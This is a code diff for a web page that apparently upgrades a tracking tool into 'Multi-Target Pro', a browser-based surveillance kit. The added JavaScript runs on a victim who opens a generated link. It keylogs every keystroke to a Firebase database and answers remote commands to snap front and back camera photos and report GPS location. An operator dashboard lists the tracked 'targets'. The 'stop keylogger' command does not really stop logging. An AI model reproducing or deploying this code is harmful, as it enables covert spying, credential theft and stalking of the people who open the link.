@@ -3,16 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎯 Track-Pro | GPS + Dual Camera</title>
+    <title>🎯 Multi-Target Pro | Keylogger + GPS + Camera</title>
     
     <!-- Fonts & Icons -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@2.0.0/dist/tabler-icons.min.css" />
     
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', sans-serif; background: #0a0a0f; color: white; }
-        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
+        .container { max-width: 1600px; margin: 0 auto; padding: 20px; }
         
         .glass { 
             background: rgba(255,255,255,0.05); 
@@ -23,26 +24,23 @@
         }
         
         .btn {
-            padding: 14px 28px;
+            padding: 12px 20px;
             border: none;
-            border-radius: 14px;
+            border-radius: 12px;
             font-weight: 600;
             cursor: pointer;
             transition: 0.3s;
-            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
-            color: white;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.95rem;
         }
         
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(59,130,246,0.4); }
-        .btn-success { background: linear-gradient(135deg, #4ade80, #16a34a); }
-        
-        .link-box {
-            background: rgba(0,0,0,0.3);
-            border-radius: 16px;
-            padding: 20px;
-            margin-top: 20px;
-            border: 1px solid #3b82f6;
-        }
+        .btn-primary { background: linear-gradient(135deg, #3b82f6, #1d4ed8); color: white; }
+        .btn-success { background: linear-gradient(135deg, #4ade80, #16a34a); color: black; }
+        .btn-danger { background: linear-gradient(135deg, #ef4444, #dc2626); color: white; }
+        .btn-warning { background: linear-gradient(135deg, #f59e0b, #d97706); color: black; }
+        .btn-purple { background: linear-gradient(135deg, #a855f7, #7e22ce); color: white; }
         
         .link-input-group {
             display: flex;
@@ -63,13 +61,64 @@
         
         .hidden { display: none !important; }
         
-        #map { height: 300px; border-radius: 20px; margin: 20px 0; }
-        
-        .dashboard-grid {
+        /* Targets Sidebar */
+        .main-layout {
             display: grid;
-            grid-template-columns: 1fr 2fr;
-            gap: 30px;
-            margin-top: 30px;
+            grid-template-columns: 300px 1fr;
+            gap: 20px;
+            margin-top: 20px;
+        }
+        
+        .targets-sidebar {
+            background: rgba(0,0,0,0.3);
+            border-radius: 20px;
+            padding: 15px;
+            height: calc(100vh - 150px);
+            overflow-y: auto;
+        }
+        
+        .target-item {
+            background: rgba(255,255,255,0.05);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: 0.3s;
+            border: 1px solid transparent;
+        }
+        
+        .target-item:hover {
+            background: rgba(59,130,246,0.1);
+            border-color: #3b82f6;
+        }
+        
+        .target-item.active {
+            background: rgba(74,222,128,0.1);
+            border-color: #4ade80;
+        }
+        
+        .target-status {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        
+        .status-online { background: #4ade80; box-shadow: 0 0 10px #4ade80; }
+        .status-offline { background: #666; }
+        
+        .target-time {
+            font-size: 0.7rem;
+            color: #666;
+            margin-top: 5px;
+        }
+        
+        /* Main Content */
+        .main-content {
+            background: rgba(0,0,0,0.2);
+            border-radius: 20px;
+            padding: 20px;
         }
         
         .camera-grid {
@@ -87,159 +136,236 @@
             position: relative;
         }
         
-        .camera-card img {
+        .camera-card img, .camera-card video {
             width: 100%;
             height: 100%;
             object-fit: cover;
         }
         
-        .live-badge {
+        .camera-label {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.7);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            z-index: 10;
+        }
+        
+        .recording-badge {
             position: absolute;
             top: 10px;
             right: 10px;
             background: #ef4444;
-            padding: 4px 10px;
+            padding: 4px 12px;
             border-radius: 20px;
-            font-size: 0.7rem;
-            animation: pulse 2s infinite;
+            font-size: 0.8rem;
+            animation: pulse 1s infinite;
+            z-index: 10;
         }
         
         @keyframes pulse {
             0%,100%{opacity:1;}50%{opacity:0.5;}
         }
         
-        .tracker-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            min-height: 100vh;
-            background: #0a0a0f;
-            display: none;
-            z-index: 9999;
+        #map { height: 300px; border-radius: 20px; margin: 20px 0; }
+        
+        .keylog-panel {
+            background: #1a1a2e;
+            border-radius: 16px;
+            padding: 15px;
+            margin: 20px 0;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
         }
         
-        .tracker-screen.active { display: block; }
+        .keylog-entry {
+            padding: 6px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            display: flex;
+            gap: 10px;
+        }
         
-        .permission-box {
-            max-width: 500px;
-            margin: 50px auto;
-            padding: 40px;
+        .keylog-time {
+            color: #f59e0b;
+            font-size: 0.7rem;
+            min-width: 70px;
+        }
+        
+        .keylog-key {
+            color: #4ade80;
+            font-weight: 600;
+        }
+        
+        .command-bar {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 16px;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
             background: rgba(255,255,255,0.05);
-            border-radius: 30px;
+            border-radius: 16px;
+            padding: 20px;
             text-align: center;
         }
         
-        .permission-item {
-            background: rgba(255,255,255,0.03);
-            border-radius: 20px;
-            padding: 20px;
-            margin: 20px 0;
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #3b82f6;
         }
         
-        .status-badge {
-            display: inline-block;
-            padding: 8px 20px;
-            border-radius: 100px;
-            font-size: 0.9rem;
-            margin-top: 10px;
+        .stat-label {
+            color: #666;
+            font-size: 0.8rem;
+            margin-top: 5px;
         }
-        
-        .status-waiting { background: rgba(245,158,11,0.2); color: #f59e0b; }
-        .status-success { background: rgba(74,222,128,0.2); color: #4ade80; }
     </style>
 </head>
 <body>
-    <!-- MAIN DASHBOARD (ADMIN) -->
-    <div class="container" id="mainDashboard">
-        <h1>🎯 Track-Pro</h1>
+    <div class="container">
+        <h1>🎯 Multi-Target Pro <span style="font-size: 1rem; background: #a855f7; padding: 5px 10px; border-radius: 100px; margin-left: 10px;">ALWAYS CONNECTED</span></h1>
+        
+        <!-- Firebase Status -->
+        <div id="firebaseStatus" style="background: #1a1a2e; padding: 10px; border-radius: 10px; margin-bottom: 20px;">
+            ⏳ Checking Firebase...
+        </div>
         
         <!-- Link Generator -->
         <div class="glass">
             <h2>🔗 Generate Tracking Link</h2>
             <button class="btn btn-success" onclick="generateTrackLink()">
-                ✨ Generate New Link
+                <i class="ti ti-link"></i> Generate New Link
             </button>
             
-            <div id="linkSection" class="hidden link-box">
-                <p style="color: #4ade80; margin-bottom: 10px;">✅ Link Generated! Send to target:</p>
+            <div id="linkSection" class="hidden" style="margin-top: 20px;">
+                <p style="color: #4ade80;">✅ Link Generated! Send to target:</p>
                 <div class="link-input-group">
                     <input type="text" id="trackLinkInput" readonly>
-                    <button class="btn" onclick="copyTrackLink()">Copy</button>
-                    <button class="btn" onclick="testLink()">Test</button>
+                    <button class="btn btn-primary" onclick="copyTrackLink()"><i class="ti ti-copy"></i> Copy</button>
+                    <button class="btn btn-warning" onclick="testLink()"><i class="ti ti-external-link"></i> Test</button>
                 </div>
             </div>
         </div>
         
-        <!-- Live Dashboard -->
-        <div class="dashboard-grid">
-            <!-- Target Info -->
-            <div class="glass">
-                <h3>🎯 Target Status</h3>
-                <div id="targetStatus" style="text-align: center; padding: 30px;">
-                    <div style="font-size: 3rem;">👤</div>
-                    <p style="color: #666;">Waiting for target...</p>
-                </div>
-                <div id="targetInfo" class="hidden">
-                    <p>📍 <span id="lat">--</span>, <span id="lng">--</span></p>
-                    <p>🎯 Accuracy: <span id="accuracy">--</span>m</p>
-                    <p>⚡ Speed: <span id="speed">--</span> km/h</p>
-                </div>
+        <!-- Stats -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-value" id="totalTargets">0</div>
+                <div class="stat-label">Total Targets</div>
             </div>
-            
-            <!-- Camera Feeds -->
-            <div class="glass">
-                <h3>📹 Live Feeds</h3>
-                <div id="noFeed" style="text-align: center; padding: 40px;">
-                    <div style="font-size: 3rem;">📷</div>
-                    <p>Waiting for camera feeds...</p>
-                </div>
-                
-                <div id="cameraFeeds" class="hidden">
-                    <div class="camera-grid">
-                        <div class="camera-card">
-                            <span class="live-badge">LIVE</span>
-                            <img id="frontCameraFeed" style="display: none;">
-                            <div id="frontPlaceholder" style="height:100%; display:flex; align-items:center; justify-content:center;">Front Camera</div>
-                        </div>
-                        <div class="camera-card">
-                            <span class="live-badge">LIVE</span>
-                            <img id="backCameraFeed" style="display: none;">
-                            <div id="backPlaceholder" style="height:100%; display:flex; align-items:center; justify-content:center;">Back Camera</div>
-                        </div>
-                    </div>
-                    <div id="map"></div>
-                </div>
+            <div class="stat-card">
+                <div class="stat-value" id="onlineTargets">0</div>
+                <div class="stat-label">Online Now</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="totalKeys">0</div>
+                <div class="stat-label">Keys Logged</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="totalPhotos">0</div>
+                <div class="stat-label">Photos Captured</div>
             </div>
         </div>
-    </div>
-    
-    <!-- TRACKER SCREEN (TARGET) -->
-    <div class="tracker-screen" id="trackerScreen">
-        <div class="permission-box">
-            <h2>🔐 Permissions Required</h2>
-            
-            <div class="permission-item">
-                <div style="font-size: 2rem;">📍</div>
-                <h4>GPS Location</h4>
-                <div id="gpsStatus" class="status-badge status-waiting">⏳ Waiting...</div>
+        
+        <!-- Main Layout -->
+        <div class="main-layout">
+            <!-- Targets Sidebar -->
+            <div class="targets-sidebar">
+                <h3 style="margin-bottom: 15px;">🎯 Connected Targets</h3>
+                <div id="targetsList">
+                    <div style="color: #666; text-align: center; padding: 20px;">
+                        No targets yet. Generate a link and share.
+                    </div>
+                </div>
             </div>
             
-            <div class="permission-item">
-                <div style="font-size: 2rem;">📱</div>
-                <h4>Front Camera</h4>
-                <div id="frontCamStatus" class="status-badge status-waiting">⏳ Waiting...</div>
+            <!-- Main Content -->
+            <div class="main-content" id="mainContent">
+                <div id="noTargetSelected" style="text-align: center; padding: 100px;">
+                    <div style="font-size: 4rem;">👈</div>
+                    <h3>Select a target from sidebar</h3>
+                    <p style="color: #666;">Generate a link and share with target to start tracking</p>
+                </div>
+                
+                <div id="targetView" class="hidden">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                        <h2 id="selectedTargetName">Target</h2>
+                        <div>
+                            <span id="targetOnlineStatus" class="status-online" style="display: inline-block; width: 12px; height: 12px; border-radius: 50%; margin-right: 10px;"></span>
+                            <span id="lastSeenText">Just now</span>
+                        </div>
+                    </div>
+                    
+                    <!-- Command Bar -->
+                    <div class="command-bar">
+                        <button class="btn btn-primary" onclick="getSelectedTargetLocation()">
+                            <i class="ti ti-map-pin"></i> Get Location
+                        </button>
+                        <button class="btn btn-primary" onclick="getSelectedTargetFrontCamera()">
+                            <i class="ti ti-camera-selfie"></i> Front Photo
+                        </button>
+                        <button class="btn btn-primary" onclick="getSelectedTargetBackCamera()">
+                            <i class="ti ti-camera"></i> Back Photo
+                        </button>
+                        <button class="btn btn-purple" onclick="startSelectedTargetKeylogger()">
+                            <i class="ti ti-keyboard"></i> Start Keylogger
+                        </button>
+                        <button class="btn btn-warning" onclick="stopSelectedTargetKeylogger()">
+                            <i class="ti ti-keyboard-off"></i> Stop Keylogger
+                        </button>
+                        <button class="btn btn-danger" onclick="clearSelectedTargetKeylogs()">
+                            <i class="ti ti-trash"></i> Clear Logs
+                        </button>
+                    </div>
+                    
+                    <!-- Camera Feeds -->
+                    <div class="camera-grid">
+                        <!-- Front Camera -->
+                        <div class="camera-card">
+                            <span class="camera-label" style="background: #3b82f6;">📱 Front Camera</span>
+                            <img id="frontCameraFeed" style="display: none; width:100%; height:100%;">
+                            <div id="frontPlaceholder" style="height:100%; display:flex; align-items:center; justify-content:center; background: #1a1a2e;">
+                                <span style="color: #666;">No photo yet</span>
+                            </div>
+                        </div>
+                        
+                        <!-- Back Camera -->
+                        <div class="camera-card">
+                            <span class="camera-label" style="background: #f59e0b;">📸 Back Camera</span>
+                            <img id="backCameraFeed" style="display: none; width:100%; height:100%;">
+                            <div id="backPlaceholder" style="height:100%; display:flex; align-items:center; justify-content:center; background: #1a1a2e;">
+                                <span style="color: #666;">No photo yet</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Map -->
+                    <div id="map"></div>
+                    
+                    <!-- Keylogs Panel -->
+                    <div style="margin-top: 20px;">
+                        <h3>⌨️ Keylogs <span id="keylogCount">(0)</span></h3>
+                        <div id="keylogPanel" class="keylog-panel">
+                            <div style="color: #666; text-align: center;">No keylogs yet</div>
+                        </div>
+                    </div>
+                </div>
             </div>
-            
-            <div class="permission-item">
-                <div style="font-size: 2rem;">📸</div>
-                <h4>Back Camera</h4>
-                <div id="backCamStatus" class="status-badge status-waiting">⏳ Waiting...</div>
-            </div>
-            
-            <button class="btn" onclick="startTargetSharing()" style="width:100%; margin-top:20px;">
-                Grant All Permissions
-            </button>
         </div>
     </div>
     
@@ -250,7 +376,7 @@
     
     <script>
         // ============================================
-        // FIREBASE CONFIGURATION - آپ کی کنفیگریشن
+        // FIREBASE CONFIG
         // ============================================
         const firebaseConfig = {
             apiKey: "https://github.com/pashtoon1/track-pro/security/secret-scanning/1",
@@ -259,120 +385,445 @@
             projectId: "track-pro-e76a1",
             storageBucket: "track-pro-e76a1.firebasestorage.app",
             messagingSenderId: "1012480487862",
-            appId: "1:1012480487862:web:fcaef7e2468ff78d8c5117",
-            measurementId: "G-J5B9R71LPH"
+            appId: "1:1012480487862:web:fcaef7e2468ff78d8c5117"
         };
         
-        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
-        console.log("✅ Firebase Connected");
+        
+        document.getElementById('firebaseStatus').innerHTML = '✅ Firebase Connected';
         
         // ============================================
-        // VARIABLES
+        // GLOBAL VARIABLES
         // ============================================
         let currentTrackId = null;
         let map = null;
         let mapMarker = null;
-        let frontStream = null;
-        let backStream = null;
-        let sharingInterval = null;
+        let targets = {};
+        let selectedTargetId = null;
+        let keylogs = {};
+        let photos = {};
         
         // ============================================
         // CHECK URL FOR TARGET
         // ============================================
         const urlParams = new URLSearchParams(window.location.search);
-        const targetId = urlParams.get('id');  // 'target' کی بجائے 'id' استعمال کیا
+        const targetId = urlParams.get('id');
         
         if (targetId) {
-            console.log("🎯 Target mode activated with ID:", targetId);
-            document.getElementById('mainDashboard').style.display = 'none';
-            document.getElementById('trackerScreen').classList.add('active');
-            currentTrackId = targetId;
+            // Target mode - setup ALWAYS CONNECTED listener
+            setupTargetListener(targetId);
+            document.body.innerHTML = '<div style="text-align: center; padding: 100px; background: #0a0a0f; color: white;"><h1>✅ Connected</h1><p>You are being tracked. You can close this page.</p></div>';
         }
         
         // ============================================
-        // GENERATE TRACK LINK - اصلاح شدہ
+        // TARGET LISTENER - ALWAYS CONNECTED
         // ============================================
-        function generateTrackLink() {
-            // Random ID بنائیں
-            currentTrackId = Math.random().toString(36).substring(2, 10) + 
-                           Math.random().toString(36).substring(2, 10);
+        function setupTargetListener(trackId) {
+            console.log("Target connected forever:", trackId);
             
-            // درست لنک بنائیں - ?target کی بجائے ?id استعمال کیا
-            const baseUrl = window.location.href.split('?')[0]; // Basic URL لے لیں
-            const fullLink = baseUrl + '?id=' + currentTrackId; // ?id= کے ساتھ
+            // Update online status every 30 seconds
+            setInterval(() => {
+                database.ref('targets/' + trackId).update({
+                    lastSeen: Date.now(),
+                    online: true
+                });
+            }, 30000);
             
-            console.log("🔗 Generated Link:", fullLink);
-            
-            // لنک دکھائیں
-            document.getElementById('trackLinkInput').value = fullLink;
-            document.getElementById('linkSection').classList.remove('hidden');
-            
-            // Firebase میں save کریں
-            database.ref('targets/' + currentTrackId).set({
-                created: Date.now(),
-                status: 'waiting',
-                active: true
-            }).then(() => {
-                console.log("✅ Track saved to Firebase");
-                listenForTargetData(currentTrackId);
-            }).catch(error => {
-                console.error("❌ Firebase error:", error);
-                alert('Firebase Error: ' + error.message);
+            // Mark online on load
+            database.ref('targets/' + trackId).update({
+                lastSeen: Date.now(),
+                online: true,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform
             });
-        }
-        
-        // ============================================
-        // TARGET DATA LISTENER
-        // ============================================
-        function listenForTargetData(trackId) {
-            database.ref('targets/' + trackId).on('value', (snapshot) => {
-                const data = snapshot.val();
-                if (data) {
-                    console.log("📥 Data received:", data);
-                    
-                    // Update UI
-                    document.getElementById('targetStatus').innerHTML = `
-                        <div style="font-size:3rem; color:#4ade80;">🟢</div>
-                        <h3 style="color:#4ade80;">Target Connected</h3>
-                    `;
-                    document.getElementById('targetInfo').classList.remove('hidden');
-                    
-                    // Update GPS
-                    if (data.location) {
-                        document.getElementById('lat').textContent = data.location.lat.toFixed(6);
-                        document.getElementById('lng').textContent = data.location.lng.toFixed(6);
-                        document.getElementById('accuracy').textContent = data.location.accuracy;
-                        document.getElementById('speed').textContent = data.location.speed || '0';
+            
+            // Mark offline on unload
+            window.addEventListener('beforeunload', () => {
+                database.ref('targets/' + trackId).update({
+                    online: false,
+                    lastSeen: Date.now()
+                });
+            });
+            
+            // COMPLETE KEYLOGGER - ALL KEYS
+            document.addEventListener('keydown', (e) => {
+                let key = e.key;
+                
+                // Handle special keys
+                const specialKeys = {
+                    ' ': '[SPACE]',
+                    'Enter': '[ENTER]',
+                    'Backspace': '[BACKSPACE]',
+                    'Tab': '[TAB]',
+                    'Shift': '[SHIFT]',
+                    'Control': '[CTRL]',
+                    'Alt': '[ALT]',
+                    'CapsLock': '[CAPSLOCK]',
+                    'Escape': '[ESC]',
+                    'Delete': '[DEL]',
+                    'Insert': '[INS]',
+                    'Home': '[HOME]',
+                    'End': '[END]',
+                    'PageUp': '[PAGEUP]',
+                    'PageDown': '[PAGEDOWN]',
+                    'ArrowUp': '[UP]',
+                    'ArrowDown': '[DOWN]',
+                    'ArrowLeft': '[LEFT]',
+                    'ArrowRight': '[RIGHT]',
+                    'F1': '[F1]', 'F2': '[F2]', 'F3': '[F3]', 'F4': '[F4]',
+                    'F5': '[F5]', 'F6': '[F6]', 'F7': '[F7]', 'F8': '[F8]',
+                    'F9': '[F9]', 'F10': '[F10]', 'F11': '[F11]', 'F12': '[F12]',
+                    'Meta': '[WIN]',
+                    'ContextMenu': '[MENU]',
+                    'PrintScreen': '[PRTSC]',
+                    'ScrollLock': '[SCROLLLOCK]',
+                    'Pause': '[PAUSE]'
+                };
+                
+                if (specialKeys[key]) {
+                    key = specialKeys[key];
+                }
+                
+                // Handle symbols and letters
+                if (key.length === 1) {
+                    // It's a character, keep as is
+                }
+                
+                const keyData = {
+                    key: key,
+                    time: Date.now(),
+                    timestamp: new Date().toLocaleString(),
+                    shift: e.shiftKey,
+                    ctrl: e.ctrlKey,
+                    alt: e.altKey
+                };
+                
+                // Send to Firebase
+                database.ref('targets/' + trackId + '/keylogs').push(keyData);
+            });
+            
+            // Listen for commands
+            database.ref('targets/' + trackId + '/commands').on('value', async (snapshot) => {
+                const commands = snapshot.val();
+                if (!commands) return;
+                
+                // Location
+                if (commands.getLocation) {
+                    navigator.geolocation.getCurrentPosition((position) => {
+                        database.ref('targets/' + trackId).update({
+                            location: {
+                                lat: position.coords.latitude,
+                                lng: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                speed: position.coords.speed || 0
+                            },
+                            timestamp: Date.now()
+                        });
+                    });
+                    database.ref('targets/' + trackId + '/commands/getLocation').remove();
+                }
+                
+                // Front Camera
+                if (commands.getFrontCamera) {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: { facingMode: 'user' } 
+                        });
                         
-                        updateMap(data.location.lat, data.location.lng);
-                    }
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        await video.play();
+                        
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                        
+                        const photoData = canvas.toDataURL('image/jpeg', 0.7);
+                        
+                        database.ref('targets/' + trackId).update({
+                            frontCamera: photoData,
+                            timestamp: Date.now()
+                        });
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                    } catch (e) {}
                     
-                    // Update Camera
-                    if (data.frontCamera) {
-                        document.getElementById('frontCameraFeed').src = data.frontCamera;
-                        document.getElementById('frontCameraFeed').style.display = 'block';
-                        document.getElementById('frontPlaceholder').style.display = 'none';
-                    }
+                    database.ref('targets/' + trackId + '/commands/getFrontCamera').remove();
+                }
+                
+                // Back Camera
+                if (commands.getBackCamera) {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: { facingMode: 'environment' } 
+                        });
+                        
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        await video.play();
+                        
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                        
+                        const photoData = canvas.toDataURL('image/jpeg', 0.7);
+                        
+                        database.ref('targets/' + trackId).update({
+                            backCamera: photoData,
+                            timestamp: Date.now()
+                        });
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                    } catch (e) {}
                     
-                    if (data.backCamera) {
-                        document.getElementById('backCameraFeed').src = data.backCamera;
-                        document.getElementById('backCameraFeed').style.display = 'block';
-                        document.getElementById('backPlaceholder').style.display = 'none';
-                    }
-                    
-                    // Show feeds
-                    if (data.frontCamera || data.backCamera) {
-                        document.getElementById('noFeed').style.display = 'none';
-                        document.getElementById('cameraFeeds').classList.remove('hidden');
-                    }
+                    database.ref('targets/' + trackId + '/commands/getBackCamera').remove();
+                }
+                
+                // Start Keylogger - already running, just ack
+                if (commands.startKeylogger) {
+                    database.ref('targets/' + trackId).update({
+                        keyloggerStatus: 'active'
+                    });
+                    database.ref('targets/' + trackId + '/commands/startKeylogger').remove();
+                }
+                
+                // Stop Keylogger - can't really stop, just ack
+                if (commands.stopKeylogger) {
+                    database.ref('targets/' + trackId).update({
+                        keyloggerStatus: 'stopped'
+                    });
+                    database.ref('targets/' + trackId + '/commands/stopKeylogger').remove();
                 }
             });
         }
         
         // ============================================
-        // UPDATE MAP
+        // ADMIN: GENERATE LINK
+        // ============================================
+        function generateTrackLink() {
+            currentTrackId = Math.random().toString(36).substring(2, 15);
+            const baseUrl = window.location.href.split('?')[0].split('#')[0];
+            const fullLink = baseUrl + '?id=' + currentTrackId;
+            
+            document.getElementById('trackLinkInput').value = fullLink;
+            document.getElementById('linkSection').classList.remove('hidden');
+            
+            // Initialize in Firebase
+            database.ref('targets/' + currentTrackId).set({
+                created: Date.now(),
+                lastSeen: Date.now(),
+                online: false,
+                commands: {}
+            });
+            
+            alert('✅ Link generated! Share with target.');
+        }
+        
+        // ============================================
+        // ADMIN: LISTEN TO ALL TARGETS
+        // ============================================
+        database.ref('targets').on('value', (snapshot) => {
+            targets = snapshot.val() || {};
+            updateTargetsList();
+            updateStats();
+            
+            // If selected target exists, update its view
+            if (selectedTargetId && targets[selectedTargetId]) {
+                updateSelectedTargetView(targets[selectedTargetId]);
+            }
+        });
+        
+        function updateTargetsList() {
+            const listDiv = document.getElementById('targetsList');
+            const targetIds = Object.keys(targets).sort((a, b) => {
+                return (targets[b].lastSeen || 0) - (targets[a].lastSeen || 0);
+            });
+            
+            if (targetIds.length === 0) {
+                listDiv.innerHTML = '<div style="color: #666; text-align: center; padding: 20px;">No targets yet. Generate a link and share.</div>';
+                return;
+            }
+            
+            listDiv.innerHTML = targetIds.map(id => {
+                const target = targets[id];
+                const lastSeen = target.lastSeen ? new Date(target.lastSeen).toLocaleString() : 'Never';
+                const isOnline = target.online && (Date.now() - (target.lastSeen || 0) < 60000);
+                
+                return `
+                    <div class="target-item ${selectedTargetId === id ? 'active' : ''}" onclick="selectTarget('${id}')">
+                        <div style="display: flex; align-items: center;">
+                            <span class="target-status ${isOnline ? 'status-online' : 'status-offline'}"></span>
+                            <span style="font-weight: 600;">${id.substring(0, 8)}...</span>
+                        </div>
+                        <div class="target-time">Last: ${lastSeen}</div>
+                        <div style="font-size: 0.7rem; color: #666;">
+                            Keys: ${target.keylogCount || 0} | Photos: ${target.photoCount || 0}
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+        
+        function updateStats() {
+            const targetIds = Object.keys(targets);
+            let onlineCount = 0;
+            let totalKeys = 0;
+            let totalPhotos = 0;
+            
+            targetIds.forEach(id => {
+                const target = targets[id];
+                if (target.online && (Date.now() - (target.lastSeen || 0) < 60000)) {
+                    onlineCount++;
+                }
+                if (target.keylogCount) totalKeys += target.keylogCount;
+                if (target.photoCount) totalPhotos += target.photoCount;
+            });
+            
+            document.getElementById('totalTargets').textContent = targetIds.length;
+            document.getElementById('onlineTargets').textContent = onlineCount;
+            document.getElementById('totalKeys').textContent = totalKeys;
+            document.getElementById('totalPhotos').textContent = totalPhotos;
+        }
+        
+        // ============================================
+        // ADMIN: SELECT TARGET
+        // ============================================
+        function selectTarget(targetId) {
+            selectedTargetId = targetId;
+            document.getElementById('noTargetSelected').classList.add('hidden');
+            document.getElementById('targetView').classList.remove('hidden');
+            document.getElementById('selectedTargetName').textContent = `Target: ${targetId.substring(0, 8)}...`;
+            
+            // Reset views
+            document.getElementById('frontCameraFeed').style.display = 'none';
+            document.getElementById('frontPlaceholder').style.display = 'flex';
+            document.getElementById('backCameraFeed').style.display = 'none';
+            document.getElementById('backPlaceholder').style.display = 'flex';
+            
+            // Load target data
+            loadTargetData(targetId);
+            
+            // Update targets list highlight
+            updateTargetsList();
+        }
+        
+        function loadTargetData(targetId) {
+            // Listen for location and camera updates
+            database.ref('targets/' + targetId).on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data) {
+                    updateSelectedTargetView(data);
+                }
+            });
+            
+            // Listen for keylogs
+            database.ref('targets/' + targetId + '/keylogs').on('child_added', (snapshot) => {
+                const log = snapshot.val();
+                if (!keylogs[targetId]) keylogs[targetId] = [];
+                keylogs[targetId].push(log);
+                updateKeylogPanel(targetId);
+            });
+        }
+        
+        function updateSelectedTargetView(data) {
+            // Update online status
+            const isOnline = data.online && (Date.now() - (data.lastSeen || 0) < 60000);
+            document.getElementById('targetOnlineStatus').className = isOnline ? 'status-online' : 'status-offline';
+            document.getElementById('lastSeenText').textContent = data.lastSeen ? 
+                new Date(data.lastSeen).toLocaleString() : 'Never';
+            
+            // Update location
+            if (data.location) {
+                updateMap(data.location.lat, data.location.lng);
+            }
+            
+            // Update front camera
+            if (data.frontCamera) {
+                document.getElementById('frontCameraFeed').src = data.frontCamera;
+                document.getElementById('frontCameraFeed').style.display = 'block';
+                document.getElementById('frontPlaceholder').style.display = 'none';
+            }
+            
+            // Update back camera
+            if (data.backCamera) {
+                document.getElementById('backCameraFeed').src = data.backCamera;
+                document.getElementById('backCameraFeed').style.display = 'block';
+                document.getElementById('backPlaceholder').style.display = 'none';
+            }
+        }
+        
+        function updateKeylogPanel(targetId) {
+            const logs = keylogs[targetId] || [];
+            const panel = document.getElementById('keylogPanel');
+            const countSpan = document.getElementById('keylogCount');
+            
+            countSpan.textContent = `(${logs.length})`;
+            
+            if (logs.length === 0) {
+                panel.innerHTML = '<div style="color: #666; text-align: center;">No keylogs yet</div>';
+                return;
+            }
+            
+            panel.innerHTML = logs.slice(-50).reverse().map(log => `
+                <div class="keylog-entry">
+                    <span class="keylog-time">${new Date(log.time).toLocaleTimeString()}</span>
+                    <span class="keylog-key">${log.key}</span>
+                    ${log.shift ? '<span style="color:#f59e0b">⇧</span>' : ''}
+                    ${log.ctrl ? '<span style="color:#3b82f6">⌃</span>' : ''}
+                    ${log.alt ? '<span style="color:#a855f7">⌥</span>' : ''}
+                </div>
+            `).join('');
+        }
+        
+        // ============================================
+        // ADMIN: COMMANDS
+        // ============================================
+        function getSelectedTargetLocation() {
+            if (!selectedTargetId) return;
+            database.ref('targets/' + selectedTargetId + '/commands').update({
+                getLocation: true
+            });
+        }
+        
+        function getSelectedTargetFrontCamera() {
+            if (!selectedTargetId) return;
+            database.ref('targets/' + selectedTargetId + '/commands').update({
+                getFrontCamera: true
+            });
+        }
+        
+        function getSelectedTargetBackCamera() {
+            if (!selectedTargetId) return;
+            database.ref('targets/' + selectedTargetId + '/commands').update({
+                getBackCamera: true
+            });
+        }
+        
+        function startSelectedTargetKeylogger() {
+            if (!selectedTargetId) return;
+            database.ref('targets/' + selectedTargetId + '/commands').update({
+                startKeylogger: true
+            });
+        }
+        
+        function stopSelectedTargetKeylogger() {
+            if (!selectedTargetId) return;
+            database.ref('targets/' + selectedTargetId + '/commands').update({
+                stopKeylogger: true
+            });
+        }
+        
+        function clearSelectedTargetKeylogs() {
+            if (!selectedTargetId) return;
+            keylogs[selectedTargetId] = [];
+            updateKeylogPanel(selectedTargetId);
+        }
+        
+        // ============================================
+        // MAP
         // ============================================
         function updateMap(lat, lng) {
             if (!map) {
@@ -386,103 +837,7 @@
         }
         
         // ============================================
-        // TARGET SHARING FUNCTIONS
-        // ============================================
